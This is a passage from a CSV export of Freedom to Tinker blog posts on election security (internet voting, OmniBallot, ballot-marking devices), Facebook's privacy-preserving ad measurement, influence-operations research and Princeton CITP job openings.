forward, we recommend that consumer-centered disclosures should be (1) relevant to the context of transaction, (2) understandable by the respective consumer audience/segment, and (3) actionable, in that the disclosure needs to be associated with the ability to express an informed decision. To read our comment in its entirety, as well as those of other commentators such as a broad coalition of state attorneys general, please visit the FTC’s docket."
"98","2022-09-12","2023-03-24","https://freedom-to-tinker.com/2022/09/12/is-internet-voting-secure-the-science-and-the-policy-battles/","I will be presenting a similarly titled paper at the 2022 Symposium Contemporary Issues in Election Law run by the University of New Hampshire Law review, October 7th in Concord, NH. The paper will be published in the UNH Law Review in 2023 and is available now on SSRN. I have already serialized parts of this paper on Freedom-to-Tinker: Securing the Vote; unsurprising and surprising insecurities in Democracy Live’s OmniBallot; the New Jersey lawsuit (and settlement); the New York (et al.) lawsuit; lawsuits in VA, NJ, NY, NH, and in NC; inherent insecurity; accommodating voters with disabilities; and Switzerland’s system. Now here it is in one coherent whole, with footnotes. Abstract. No known technology can make internet voting secure, according to the clear scientific consensus. In some applications—such as e-pollbooks (voter sign-in), voter registration, and absentee ballot request—it is appropriate to use the internet, as the inherent insecurity can be mitigated by other means. But the insecurity of paperless transmission of a voted ballot through the internet, cannot be mitigated. The law recognizes this in several ways. Courts have enjoined the use of certain paperless or internet-connected voting systems. Federal law requires states to allow voters to use the internet to request absentee ballots, but carefully stops short of internet ballot return (i.e., voting). But many U.S. states and a few countries go beyond what is safe: they have adopted internet voting, for citizens living abroad and (in some cases) for voters with disabilities. Most internet voting systems have an essentially common architecture, and they are insecure at least at the same key point, after the voter has reviewed the ballot but before it is transmitted. I review six internet voting systems deployed 2006-2021 that were insecure in practice, just as predicted by theory—and some were also insecure in surprising new ways, “unforced errors”. We can’t get along without the assistance of computers. U.S. ballots are too long to count entirely by hand unless the special circumstances of a recount require it. So computer-counted paper ballots play a critical role in the security and auditability of our elections. But audits cannot be used to secure internet voting systems, which have no paper ballots that form an auditable paper trail. So there are policy controversies: trustworthiness versus convenience, security versus accessibility. In 2019-22 there were lawsuits in Virginia, New Jersey, New York, New Hampshire, and North Carolina; legislation enacted in Rhode Island and withdrawn in California. There is a common pattern to these disputes, which have mostly resolved in a way that provides remote accessible vote by mail (RAVBM) but stops short of permitting electronic ballot return (internet voting). What would it take to thoroughly review a proposed internet voting system to be assured whether it delivers the security it promises? Switzerland provides a case study. In Switzerland, after a few years of internet voting pilot projects, the Federal Chancellery commissioned several extremely thorough expert studies of their deployed system. These reports teach us not only about their internet voting system itself but about how to study those systems before making policy decisions. Accessibility of election systems to voters with disabilities is a genuine problem. Disability-rights groups have been among those lobbying for internet voting (which is not securable) and other forms of remote accessible vote by mail (which can be adequately securable). I review statistics showing that internet voting is probably not the most effective way to serve voters with disabilities."
"99","2020-06-08","2023-03-24","https://freedom-to-tinker.com/2020/06/08/democracy-live-internet-voting-unsurprisingly-insecure-and-surprisingly-insecure/","The OmniBallot internet voting system from Democracy Live finds surprising new ways to be insecure, in addition to the usual (severe, fatal) insecurities common to all internet voting systems. There’s a very clear scientific consensus that “the Internet should not be used for the return of marked ballots” because “no known technology guarantees the secrecy, security, and verifiability of a marked ballot transmitted over the Internet.” That’s from the National Academies 2018 consensus study report, consistent with May 2020 recommendations from the U.S. EAC/NIST/FBI/CISA. So it is no surprise that this internet voting system (Washington D.C., 2010) is insecure , and this one (Estonia 2014) is insecure, and that internet voting system is insecure (Australia 2015) , and this one (Sctyl, Switzerland 2019), and that one (Voatz, West Virginia 2020) A new report by Michael Specter (MIT) and Alex Halderman (U. of Michigan) demonstrates that the OmniBallot internet voting system from Democracy Live is fatally insecure. That by itself is not surprising, as “no known technology” could make it secure. What’s surprising is all the unexpected insecurities that Democracy Live crammed into OmniBallot–and the way that Democracy Live skims so much of the voter’s private information. OmniBallot has three modes of use: (1) internet download of unvoted absentee ballots to print at home and mark by hand; (2) using the voter’s home computer to mark ballot selections, for printing ballots at home to be mailed back; and (3) “online voting,” which is the internet return of voted ballots as PDF files. OmniBallot’s online voting feature (internet return of voted ballots as PDF files) “uses a simplistic approach” and “as a result, votes returned online can be altered, potentially without detection, by a wide range of parties,” including either insiders or hackers. Not surprising: this is the standard insecurity of online voting systems: hackers can steal votes (in a “scalable” way, according to the EAC/NIST/FBI/CISA report). Surprise! Insiders at any of four private companies (Democracy Live, Google, Amazon, Cloudflare), or any hackers who manage to hack into these companies, can steal votes. That’s because Democracy Live doesn’t run its own servers–it uses all of these services in building its own product. Well, in hindsight, not so surprising–this is the way modern internet services work. OmniBallot has a mode of use in which the voter uses her home computer to mark a ballot, then print that ballot as an optical-scan absentee ballot to be mailed in. In this mode it appears that the voter’s ballot selections (votes) are not being sent over the internet. Surprise! Even in this mode of use, the OmniBallot system “send[s] the voter’s identity and ballot selections to Democracy Live” (and Amazon). Not a surprise: Even when OmniBallot is used only for downloading unvoted absentee ballots to print at home and mark by hand, “there are important security and privacy risks … including the risk that ballots could be … subtly manipulated in ways that cause them to be counted incorrectly.” It’s well understood that a hacker could alter the PDF file to rearrange where the fill-in-the-ovals are, so an optical-scanner would count a vote for Smith as a vote for Jones. I’ll discuss this further in the comments below. And finally, Surprise! “In all modes of operation, Democracy Live receives a wealth of sensitive personally identifiable information: voters’ names, addresses, dates of birth, physical locations, party affiliations, and partial social security numbers. When ballots are marked or returned online, the company also receives voters’ ballot selections, and it collects a browser fingerprint during online voting. This information would be highly valuable for political purposes or for election interference, as it could be used to target ads or disinformation campaigns based on the voter’s fine-grained preferences. Nevertheless, OmniBallot has no posted privacy policy, and it is unclear whether there are any effective legal limitations on the company’s use of the data.“ This is shocking: it’s bad enough that companies like Cambridge Analytica gathered huge amounts of personal information on individual voters for the purposes of microtargeting disinformation–they took that data from people who made the mistake of signing up for Facebook. But the citizen who just wants to exercise their right to vote–for the State to force that voter to surrender personally identifying data to a private company with no apparent restrictions on its use–goes beyond even the Facebook scandal. No state should participate in such a scheme."
"100","2022-10-13","2023-03-24","https://freedom-to-tinker.com/2022/10/13/were-hiring-citp-fellows/","The Princeton Center for Information Technology Policy is happy to announce that applications for our in-residence Fellows Program are now open. CITP is seeking candidates for the following three Fellows tracks: Microsoft Visiting Research Scholar/Visiting Professor of Information Technology Policy Postdoctoral Research Associate, or More Senior Researcher Visiting Professional The Fellows Program is a competitive program that supports scholars and practitioners in research and policy work tied to the Center’s mission. Fellows conduct research with other members of the CITP community across disciplines, and engage in our public programs, such as workshops and conferences. Applicants may apply for more than one track position. Please note that CITP research falls into the following three areas: Platforms and Digital Infrastructure; Data Science, AI and Society; and Privacy and Security. The application review process begins mid-December."
"101","2022-11-17","2023-03-24","https://freedom-to-tinker.com/2022/11/17/citp-is-hiring-a-professor/","We are seeking an Assistant, Associate, or Full professor whose work aligns with one or more of our three focus areas. Data Science and the intersection of Artificial Intelligence and Society Privacy and Security, and Digital Platforms and Infrastructure Please visit the Princeton University open position’s page for more details about the position and the application. Both CITP and Princeton University seek for our research communities to be diverse and inclusive. This commitment informs our approach to recruiting and hiring faculty with a strong commitment to teaching, mentoring, and research. The deadline to apply is December 1, 2022."
"102","2021-11-22","2023-03-24","https://freedom-to-tinker.com/2021/11/22/signal-loss-and-advertising-privacy-on-facebook/","The 2021 Kyoto Prize in Advanced Technology, a major award administered by a Japanese foundation, goes to Andrew Chi-Chih Yao, a Chinese computer scientist who earned PhDs from Harvard and the University of Illinois before being a professor at MIT, Stanford, and Princeton and then becoming Dean of an important theoretical computer science education program at Tsinghua University. Professor Yao is a theorist, his many major important results are in “computational complexity theory,” so how did he win an international award in “Advanced Technology?” Well, one of his major results led to the invention of Secure Multiparty Computation (MPC), by which two or more people can pool their data to compute a result without actually disclosing their data to each other. And in this article I’ll explain how one present day company seems to be applying MPC to try to comply with privacy rules issued by regulators. Facebook tracks your web browsing in order to make money delivering ads to you. Facebook has been under pressure from the European Union and from Apple to be less invasive of your privacy. For example, in 2017 the EU put out a new Privacy Directive, and in 2019 Apple’s Safari browser stopped attaching cookies to third-party image requests. In this article I’ll discuss some indications that Facebook is beginning to adjust its advertising-tracking model so they can make money without invading your privacy quite as much. They are experimenting with secure multiparty computation, a “privacy enhancing technology” developed in academia, to measure which ad “impressions” convert to purchases on the average–but without knowing which individuals saw an ad and then made a purchase. When you browse from one web site to another, many sites snoop on your browsing history, by tracking mechanisms such as cookies and single-pixel images (whose purpose is to track your http image-load requests). Much of this tracking is for the purpose of making money by targeting ads to you. Merchants (for example Nike) pay web sites (such as Facebook) to deliver ad views (“impressions”), and Nike pays more for impressions that “convert”, that is, lead to a purchase. So, Facebook and (independently) Nike would like to (1) deliver ads that are likely to convert, and (2) measure which impressions are converting. Facebook wants to make more money by delivering to you the ads most likely to convert, and Nike wants to make sure it’s getting its money’s worth from its ad budget. One way to do this is: when you make a purchase at the Nike online store, the browser sends Facebook a copy of your nike.com shopping cart and your Facebook user ID. Then Facebook looks up what Nike ads they displayed recently to that user ID; those ads converted to shoe sales, and Nike is happy to pay more for such ads. That tracking can be a terrible invasion of privacy. So for years now, regulators (in California and the European Union) and browser makers (like Firefox) have been adjusting restrictions on cookies (and other kinds of tracking) to try to improve privacy. Facebook’s internal euphemism for privacy enforcement is “signal loss.” Here’s an analysis of the problem, from an advertiser’s point of view (warning: much marketing-speak!). The “signal” is the data that Facebook needs to manage its core revenue stream, advertising. (When the browser maker (Google, or Apple) is also a major advertising platform, there’s an inherent conflict of interest: Apple’s Safari restricts Facebook and Google’s ad tracking more than it restricts Apple’s own ad tracking, and Google-the-browser-maker delayed tightening Chrome’s cookie-rules for two years because Google-the-ad-platform needed those cookies.) So for years now, advertising platforms (like Facebook) have been adapting the way they intrusively track you, so they can still make money delivering relevant ads. For example, aside from using cookies and tracking pixels inside the browser, Nike and Facebook share things they know about you outside, like your e-mail address, phone number, and home address. Facebook’s system for that is their “Conversions API”, a software interface for merchants, to measure which advertisements “convert”, using server-to-server communications in the back end. In any case, there’s pressure on Facebook (and Google and other advertising platforms) to be more respectful of privacy. When it was just the U.S. Congress asking Zuck to testify at hearings, Facebook could perhaps laugh it off, but when entities with real enforcement power (Apple and California and the EU) start to insist on their users’ and citizens’ privacy, then Facebook might ask themselves, “How can we make money without so much privacy invasion?” Google is trying one method, called “Federated Learning of Cohorts” (FLoC), but privacy advocates have severely criticized it, for good reason: instead of sharing your entire history, FLoC labels you with a summary of your history. That’s still a significant privacy invasion, and it may even make it easier for bad guys to track large numbers of people in harmful ways. Is there a better way? Academic research on secure multiparty computation (MPC) has shown how to measure a global property (how many Nike ads converted into sales) without identifying specific users’ histories. In particular, with the right multiparty protocol, Nike (or Facebook) can’t tell which specific purchases at nike.com resulted from ads, and they can’t tell which specific ad-impressions resulted in sales, but they can measure the average. And that’s good enough: good enough for Facebook to target you with ads that are more likely to convert; good enough for Nike to know that they’re getting their money’s worth from Facebook. The way this kind of MPC would work is, the ad platform (such as Facebook) knows what ads it shows to each user. The merchant (such as Nike) knows which shoes it sold to each purchaser. They want to jointly compute the effectiveness of the ad campaign, but without Facebook revealing to Nike anything about individual users, and without Nike revealing to Facebook anything about individual purchasers. (but see note 1 below) So Nike would encrypt its collection of shopping carts, and Facebook would encrypt its collection of ad-impression data, and they use homomorphic encryption to compute the “join” of these relations without either one seeing the other’s unencrypted data. And indeed, Facebook claims to be adopting this method (though this explainer is very short on technical details). But Facebook has a public github repo for their new API for advertisers, based on MPC. And this press release says they’re already testing their “Private Lift Measurement” with some advertisers. Will Facebook adopt this for all advertisers? If they do, then I think it really will be a privacy improvement. It’s more private than Google’s solution of publicly labeling each user with a summary of their history. Of course, Facebook still knows where on Facebook you’ve been, in every detail; and Nike still knows what you browsed in their on-line store; but nobody will know both at once. Although MPC can measure ad conversions–whether Facebook is delivering ads that will increase shoe sales–it probably cannot target ads quite as precisely. That is, Facebook’s machine-learning criteria to decide which ads to show you might work better if they do their super-privacy-intrusive tracking of everything you do on and off Facebook. By limiting their tracking to on-Facebook-only, they may find that ad impressions have a slightly lower conversion rate, so Facebook makes slightly less money. Time will tell whether they’re willing to take that hit. And SMP won’t solve other societal problems that aren’t related to privacy: The duopoly of Google/Youtube and Facebook/Instagram in online advertising, Youtube and Facebook’s recommender systems pushing users towards extreme views, Youtube and Facebook trying to maximize the amount of time you waste on-line, Instagram harmful to teenage girls–none of these are about privacy, and secure multiparty computation doesn’t address those problems. Note 1. Sarah Scheffler, a postdoctoral fellow at Princeton’s Center for Information Technology Policy (CITP), writes, MPC’s “private” nature in these descriptions depends not only on using MPC, but also on using MPC to compute a privacy-preserving function. MPC could be used in the way you describe to privately compute average ad conversions, but could also be used to say, “privately” compute the list of users who are shared between Nike and Facebook or something (and I’ve heard suggestions of it being used for exactly that purpose). In the latter case, it’s still technically more private than Facebook and Nike comparing lists in the clear, but I don’t think it’s what most people want from “private computing”. So Sarah and I took a look at Facebook’s open-source MPC repo, where we see strong evidence that they are computing appropriately private functions (such as “total value of an ad campaign”)."
"103","2021-01-27","2023-03-24","https://freedom-to-tinker.com/2021/01/27/using-an-old-model-for-new-questions-on-influence-operations/","Alicia Wanless, Kristen DeCaires Gall, and Jacob N. Shapiro Freedom to Tinker: https://freedom-to-tinker.com/ Expanding the knowledge base around influence operations has proven challenging, despite known threats to elections,COVID-related misinformation circulating worldwide, and recent tragic events at the U.S. Capitol fueled in part by political misinformation and conspiracy theories. Credible, replicable evidence from highly sensitive data can be difficult to obtain. The bridge between industry and academia remains riddled with red tape. Intentional and systemic obstructions continue to hinder research on a range of important questions about how influence operations spread, their effects, and the efficacy of countermeasures. A key part of the challenge lies in the basic motivations for both industry and academic sectors. Tech companies have little incentive to share sensitive data or allocate resources to an effort that does not end in a commercial product, and may even jeopardize their existing one. As a result, cross-platform advances to manage the spread of influence operations have been limited, with the notable exception of successful counter-terrorism data sharing. Researchers who seek to build relationships with specific companies encounter well-documented obstacles in accessing and sharing information, and subtler ones in the time-consuming process of learning how to navigate internal politics. Companies face difficulties recruiting in-house experts from academia as well, as many scholars worry about publication limitations and lack of autonomy when moving to industry. The combination of these factors leaves a gap in research on non-commercial issues, at least in relation to the volume of consumer data tech companies ingest. And, unfortunately, studying influence in a purely academic setting presents all the challenges of normal research—inconsistent funding streams, access to quality data, and retaining motivated research staff—as well as the security and confidentiality issues that accompany any mass transfer of data. We are left with a lack of high-quality, long-term research on influence operations. Fortunately, a way forward exists. The U.S. government long-ago recognized that neither market nor academic incentives can motivate all the research large organizations need. Following World War II, it created a range of independent research institutions. Among them, the Federally Funded Research and Development Centers (FFRDCs) were created explicitly to “provide federal agencies with R&D capabilities that cannot be effectively met by the federal government or the private sector alone”. FFRDCs – IDA, MITRE, and RAND for example – are non-profit organizations funded by Congress for longer periods of time (typically five years) to pursue specific limited research agendas. They are prohibited from competing for other contracts, which enable for-profit firms to share sensitive data with them, even outside of the protections of the national security classification system, and can invest in staffing choices and projects that span short government budget cycles. These organizations bridge the divide between university research centers and for-profit contractors, allowing them to fill critical analytical gaps for important research questions. The FFRDC model is far from perfect. Like many government contractors, some have historically had cost inefficiencyand security issues. But by solving a range of execution challenges, they enable important, but not always market-driven research on topics ranging from space exploration, to renewable energy, to cancer treatment. Adopting a similar model of a multi-stakeholder research and development center (MRDC) funded by industry and civil society could lay a foundation for collaboration on issues pertaining to misinformation and influence operations by accomplishing five essential tasks: Facilitate funding for long-term projects. Provide infrastructure for developing shared research agendas and a mechanism for executing studies. Create conditions that help build trusted, long-term relationships between sectors. Offer career opportunities for talented researchers wishing to do basic research with practical application. Guard against inappropriate disclosures while enabling high-credibility studies with sensitive information that cannot be made public. The MDRC model fills a very practical need for flexibility and speed on the front end of addressing immediate problems, such as understanding what, if any, role foreign nations played in the discussions which led up to January 6. Such an organization would provide a bridge for academics and practitioners to come together quickly and collaborate for a sustained period, months or years, on real-world operational issues. A research project at a university can take six months to a year to set up funding and fully staff a project. Furthermore, most universities, and even organizations like the Stanford Internet Observatory fully dedicated to these issues, cannot do “work for hire”. Meaning, if there’s no unique intellectual product or no true research question at hand, their ability to work on a given problem is limited or non-existent. An established contract organization that clearly owns a topic, fully staffed with experts in house, minimizes these hindrances. Because an MDRC focused on influence operations does not fit neatly into existing organizational structures, its initial setup should be an iterative process. It should start with two or more tech companies joining with a cluster of academic organizations on a discrete set of deliverables, all with firm security agreements in place. Once the initial set of projects proves the model’s value, and plans for budgets and researcher time are solidified, the organization could be expanded. The negative impact of internet platforms’ impact on society did not grow over night, and we certainly do not expect the solution to either. And, tempting as it is to think the U.S. government could simply fund such an institution, it likely needs to remain independent of government funding in order to avoid collusion concerns from the international community. Steps toward bridging the gap between academia and the social media firms have already taken place. Facebook’s recent provision of academic access to Crowdtangle, meant in part to provide increased transparency on influence operations and disinformation, is a good step, as is its data-sharing partnership with several universities to look at election-related content. Such efforts will enable some work currently stymied by data sharing, but they do not address the deeper incentive-related issues. Establishing a long-term MDRC around the study of influence operations and misinformation is more crucial than ever. It is a logical way forward to address these questions at the scale they deserve."
"104","2021-02-01","2023-03-24","https://freedom-to-tinker.com/2021/02/01/georgias-election-certification-avoided-an-even-worse-nightmare-thats-just-waiting-to-happen-next-time/","Voters in Georgia polling places, 2020, used Ballot-Marking Devices (BMDs), touchscreen computers that print out paper ballots; then voters fed those ballots into Precinct-Count Optical Scan (PCOS) voting machines for tabulation. There were many allegations about hacking of Georgia’s Presidential election. Based on the statewide audit, we can know that the PCOS machines were not cheating (in any way that changed the outcome). But can we know that the touchscreen BMDs were not cheating? And what about next time? There’s a nightmare scenario waiting to happen if Georgia (or other states) continue to use touchscreen BMDs on a large scale. Dominion ICX ballot-marking device used in Georgia polling places 2020. Voters use the touchscreen to select candidates, then a paper ballot is printed out, which the voter then feeds into the scanner for tabulation and for retention in a ballot box. Dominion ICP optical-scanner used in Georgia polling places 2020. 25% of Georgia voters in 2020 voted by mail; they marked their optical-scan ballot by hand, so they didn’t need to worry about whether the computer that marked their ballot was hacked–no computer marked their ballot! This is a high-speed central-count scanner that counts mail-in ballots; the screen on the right is not a touch-screen for the voter, it’s a control computer for the election administrators. It’s legitimate to worry about whether the optical scanners are hacked—but the hand audits of the paper ballots (by people, not computers) resolved that question in Georgia 2020. Part 1: What happened in November 2020 There were many allegations about hacking of Georgia’s voting-machine computers in the November 2020 election—accusations about who owned the company that made the voting machines, accusations about who might have hacked into the computers. An important principle of election integrity is “software independence,” which I’ll paraphrase as saying that we should be able to verify the outcome of the election without having to know who wrote the software in the voting machines. Indeed, the State of Georgia did a manual audit of all the paper ballots in the November 2020 Presidential election. The audit agreed with the outcome claimed by the optical-scan voting machines. This means, The software in Georgia’s PCOS scanners is now irrelevant to the outcome of the 2020 Presidential election in Georgia, which has been confirmed by the audit. Georgia’s PCOS scanners were not cheating in the 2020 Presidential election (certainly not by enough to change the outcome), which we know because the hand-count audits closely agreed with the PCOS counts. The audit gave election officials the opportunity to notice that several batches of ballots hadn’t even been counted the first time; properly counting those ballots changed the vote totals but not the outcome. I’ll discuss that in a future post. Suppose the polling-place optical scanners had been hacked (enough to change the outcome). Then this would have been detected in the audit, and (in principle) Georgia would have been able to recover by doing a full recount.† That’s what we mean when we say optical-scan voting machines have “strong software independence”—you can obtain a trustworthy result even if you’re not sure about the software in the machine on election day. If Georgia had still been using the paperless touchscreen DRE voting machines that they used from 2003 to 2019, then there would have been no paper ballots to recount, and no way to disprove the allegations that the election was hacked. That would have been a nightmare scenario. I’ll bet that Secretary of State Raffensperger now appreciates why the Federal Court forced him to stop using those DRE machines (Curling v. Raffensperger, Case 1:17-cv-02989-AT Document 579). But optical scanners are not the only voting machines in Georgia’s polling places. Every in-person Georgia voter uses two machines: first, voters select candidates on a touch-screen ballot-marking device (BMD) that prints out a ballot paper; then, they feed that ballot paper into a precinct-count optical scanner (PCOS). The software independence of BMDs is much more problematic. The audit confirmed that the PCOS was not cheating. How do we know that the BMD was not cheating, printing different votes onto the ballot paper than what the voter selected on the touch screen? This is a much more difficult question, and it can’t be answered by any audit or recount of the ballot papers. You might think, “the voter would notice if the ballot paper differs from what they indicated on the touch screen.” But two different scientific studies have shown that most voters don’t notice. Only about 7% of voters speak up if a touchscreen BMD fraudulently prints a wrong vote. And that’s just one estimate from one study—it might actually be overoptimistic.*** Biden got about 50.125% of the votes in Georgia, and Trump got 49.875%. Suppose, hypothetically, that 50.125% of the voters chose Trump, but (hypothetically) hacked BMDs were changing votes on 0.25% of the ballots, in favor of Biden. Then the result we’d see would be Biden 50.125%, and the recount would confirm that—because that’s what’s printed on the paper. In this scenario, if 7% (1 out of 15) of voters carefully review their paper ballot, and 0.25% (1 out of 400) of paper ballots had votes for Biden when the voter had really chosen Trump, then we might expect 1 out of 6000 (15×400) voters to complain to the pollworkers. And the pollworkers would supposedly tell those voters, “no problem, don’t put that ballot into the PCOS, we’ll void that for you and you can mark a fresh ballot.” But all those other voters who didn’t carefully check the printout would still be voting for a candidate they didn’t intend to, and the hack would be successful. You might think (in this hypothetical scenario), “at least some voters caught the BMDs cheating”. But even if a voter catches the machine cheating, so what? Election officials can’t void an entire election, or “correct” the vote totals, based on the say-so of 0.017% (that is, 1/6000) of the voters. Did the touchscreen BMDs cheat in the Georgia 2020 Presidential Election? We can guess that they did not cheat this time, and here’s a weak basis for that guess: If the BMDs had been shifting enough votes from Trump to Biden to make a difference, then at least 0.017% of voters would have noticed. There were 5 million votes cast, so that’s about 83 833 voters statewide**. If those voters complained, then presumably the local news media would have reported contemporaneous reports of such “BMD vote flipping.” But we didn’t hear any such reports.**** So probably the BMDs weren’t flipping any votes. That’s a pretty weak basis to assert that the BMDs weren’t cheating. But it could be a lot worse . . . Part 2: The nightmare scenario just waiting to happen next time. But what about the next election? Suppose in Georgia’s 2022 Senate election between Raphael Warnock and his Republican challenger (whoever that will be), one of those candidates wins with 50.125% of the vote. And suppose 100 voters statewide claim that the BMDs flipped their vote. What should Secretary of State Raffensperger do? He cannot change the election results based on the say-so of 100 voters—those voters might be mistaken (or lying) about what they indicated on the touch screen. He cannot fix it by a recount, because (if the BMDs were really cheating) the paper ballots are fraudulent. He will be in a bind, and there will be no way out. And no way out for the people of Georgia, either. You might argue, “More than 7% of voters would notice that their paper ballot was incorrectly marked.” Even if that were true (there’s no evidence for it), it just means 2000 or 3000 voters statewide (10 or 20 per county) would have noticed, instead of just 83 833. The problem is the same: even if they notice, there’s no way to correct the election. The solution is simple. Voters should mark their optical-scan bubble ballots with a pen. That way, you know the recount is counting the ballots that the voter actually marked. Touchscreen BMDs (which also have audio interfaces for blind voters) should be reserved for those voters with disabilities who cannot mark a paper ballot by hand. Georgia should continue using their PCOS (optical scan) voting machines, which will readily count hand-marked optical-scan “bubble” ballots. No major investment in new equipment is needed. This change can easily be implemented before the next election. And other states and counties that are considering BMDs-for-all-voters—some counties in Pennsylvania and New Jersey have bought those, New York is considering them—should consider the nightmare scenario, and stick with hand-marked paper ballots. Everything I’ve described here is consistent with the peer-reviewed scientific paper, Ballot-Marking Devices Cannot Assure the Will of the Voters, by Andrew W. Appel, Richard A. DeMillo, and Philip B. Stark, in Election Law Journal, vol. 19 no. 3, pp. 432-450, September 2020. [non-paywall version here] † Georgia’s law doesn’t actually say what’s required if the audit detects a problem. The law doesn’t specify that audit results are binding on official results. This year that didn’t matter, because the audit agreed with the official outcome. *Georgia’s audit was done by examining the ballots with human eyes. Later, at the request of the Trump campaign, Georgia also did a recount using their central-count optical scanners. If those optical scanners had been hacked to cheat consistently with (hypothetically) cheating precinct-count optical scanners, then the machine recount wouldn’t catch the fraud. For that reason, a hand-count is more effective protection than a machine recount. In any case, all three counts (the polling-place count using PCOS, the audit, and the machine recount) showed a Biden victory, although their actual numbers of votes differed. **Actually, this year a large proportion of Georgians voted by mail, on hand-marked paper ballots, so they didn’t use BMDs at all. Those votes are safe from BMD hacks. But it doesn’t change the “ 83 833 voters statewide” result of my analysis. ***That statistic (“7% of voters will notice if the BMD prints the wrong candidate on their ballot”) comes from a single study in Michigan. Here’s why it might be overoptimistic, as applied to this voting machine and these voters. First, look at the BMD ballot and how hard it is to read.***** In November, one observer watched a constant stream of voters during about 20 minutes in Cobb County: they voted without a glance at their paper ballots, but then they told the poll workers that they had checked them. It is just too much trouble to try to read and check them. In the January 2021 Senate runoffs, another observer saw that only 6 of 46 voters even glanced at the paper—which is not the same as checking it carefully. ****We would like to think “there was no local news reporting of BMD-flipped votes” means that “BMDs didn’t flip votes”. But so much of Georgia is quite rural with very little local reporting, and certainly without the experience to know how to even report something like that. And (in other elections) it often happens that there are verified stories of discrepancies months after the election that never made it to any newspaper. *****I mean, really! not easy to decode the paper printout. In the Senate race, this is what the ballot says: For United States Senate (Loeffler) -
Special (Vote for One) (NP)
   Vote for Annette Davis Jackson
     (Rep)
 Is that a vote for Kelly Loeffler, whose name appears on the first line? Apparently not, I’d guess it’s a vote for Annette Davis Jackson. And what does (NP) mean? And what does (I) mean attached to votes for many other candidates? Certainly (I) does not mean Independent. This ballot is a masterpiece of bad design, and it’s no wonder that real-life voters are discouraged from looking at it very carefully. Edited 8 February 2021 to correct 83 to 833."
"105","2021-03-26","2023-03-24","https://freedom-to-tinker.com/2021/03/26/citp-is-hiring-a-communications-manager/","The Communications Manager at the Center for Information Technology Policy (CITP) will serve as the lead for all external and internal communications efforts of the center. This will include developing CITP’s content strategy and managing the center’s website, Freedom to Tinker blog, and social media presence. The position requires coordination and collaboration with researchers at the center, communications groups at Princeton, and, at times, managing freelance specialists. If you have experiences in writing and editing, the ability to understand and translate tech policy to broader audiences, and managing an online presence and outreach, please click here for more information and to apply."
"106","2021-11-18","2023-03-24","https://freedom-to-tinker.com/2021/11/18/citp-emerging-scholars-application-is-open/","The CITP Emerging Scholars program is a post-baccalaureate program that brings in people who have a bachelor’s degree for two-year staff positions at CITP. The program provides intensive research and/or work experience with real impact, along with coursework and mentoring. The ideal outcome for participants is to either enter a competitive graduate program or to find an impactful placement in government, nonprofits or the private sector. The Emerging Scholars program is for people who have received a bachelor’s degree (or will receive one by the time of appointment) in fields such as computer science, sociology, economics, political science, psychology, public policy, information science, communication, philosophy, and other related disciplines. CITP Emerging Scholars program participants are hired as salaried research specialists and will receive all benefits associated with their status as regular University staff. Candidates are encouraged to apply by January 14, 2022 for full consideration."
"107","2021-04-12","2023-03-24","https://freedom-to-tinker.com/2021/04/12/juan-gilberts-transparent-bmd/","Princeton’s Center for Information Technology Policy recently hosted a talk by Professor Juan Gilbert of the University of Florida, in which he demonstrated his interesting new invention and presented results from user studies. What’s the problem with ballot-marking devices? It’s well known that a voting system must use paper ballots to be trustworthy (at least with any known or foreseeable technology). But how should voters mark their ballots? Hand-marked paper ballots (HMPB) allow voters to fill in ovals with a pen, to be counted by an optical scanner. Ballot-marking devices (BMDs) allow voters to use a touchscreen (or other assistive device) and then print out a ballot card listing the voter’s choices. The biggest problem with BMDs is that most voters don’t check the ballot card carefully, so that if the BMD were hacked and misrepresenting votes on the paper, the voters wouldn’t notice–and even if a few voters did notice, the BMDs would have successfully stolen the votes of many other voters. One scientific study (not in a real election) showed that some process interventions–such as, “remind voters to check their ballots”–might improve the rate at which voters check their ballots. I am skeptical that those kinds of interventions will be consistently applied in thousands of polling places, or that voters will stay vigilant year after year. And even if the rate of checking can be improved from 6.6% to 50%, there’s still no clear remedy that can protect the outcome of the election as a whole. The transparent BMD Instead of reminding the voter, Professor Gilbert’s solution is to force them to look directly at the printout, immediately after voting each contest. In this video, at 0:36, see how the voter is asked to touch the screen directly in front of the spot on the paper where the vote was just printed. Voter’s finger confirming a printed-on-paper vote by touching the screen directly in front of where the vote was printed. He explains more in the CITP seminar he presented at Princeton. He also explains his user studies. When the BMD deliberately printed one vote wrong on the paper ballot (out of 12 contests on the ballot), 36% of voters noticed and said something about it–and another 41% noticed but didn’t say anything until asked. This is a significantly higher rate of detection than when using conventional BMDs. Hypothetically, if those 41% could somehow be prompted to speak up, then there’d be a 77% rate at which voters would detect and correct fraudulent vote-flipping. Somehow, this physically embodied intervention seems more consistently effective than one that requires sustained cooperation from election administrators, poll workers, and voters–all of whom are only human. Would this make BMDs safe to use? Recall what the problem is: If the BMD cheats on X% of the votes in a certain contest, and only Y% of the voters check their ballot carefully, and only Z% of those will actually speak up, then only X*Y*Z% voters will speak up. In a very close election, X might be 1/100, Y has been measured as 1/15, and Z might be 1/2, so XYZ=1/3000. Professor Gilbert has demonstrated that (with the right technology) X can be improved to 76% (or 3/4) but Z is still about 1/2. Suppose further tinkering could improve Z to 3/4, then XYZ would be 1/178. That is, if the hacked BMD attempted to steal 1% of the votes, then 9/16 of those voters would notice (and ask the pollworkers for a do-over), so the net rate of theft would be only 7/16 of 1%, or about half a percent. And in that hypothetical scenario, one voter out of every 178 would have asked for a do-over, saying “what printed on the paper isn’t what I selected on the touchscreen.” That’s (perhaps) two or three in every medium-size polling place–or, in a statewide election with 3 million voters, that’s more than 16,000 voters speaking up. If that happened, and if the margin of victory is less than half-a-percent, then what should the Secretary of State do? The answer is still not clear. You can read this to see the difficulty. So, the Transparent BMD is a really interesting research advance; it is a really good design idea; and Professor Gilbert’s user-studies are professionally done. But further research is needed to figure out how such machines could (safely) be used in real elections. And there’s still no excuse for using conventional BMDs, with their abysmal rate at which voters check their ballot papers, as the default mode for all voters in a public election. Further caveats. These are considerations for the evaluation of the practical security of “transparent BMDs” in elections, worth further study. If a voter speaks up and says “the machine changed my vote”, will the local pollworkers respond appropriately? Suppose there have been many elections in a row where the voting machines haven’t been hacked (which we certainly hope is the case!); then whatever training the pollworkers are supposed to have may have been omitted or forgotten. When analyzing whether a new physical design is more secure, one must be careful to assume that the hacker can install software that can behave any way that the hardware is capable of. Just to take one example, suppose the hacked BMD software is designed to behave like a conventional BMD: first accept all the voter’s choices, then print (without forcing the voter to touch the screen where the gaze is directed to the just-printed candidate). This gives the opportunity to deliberately misprint in a way that we know voters don’t detect very well. But would voters know that the 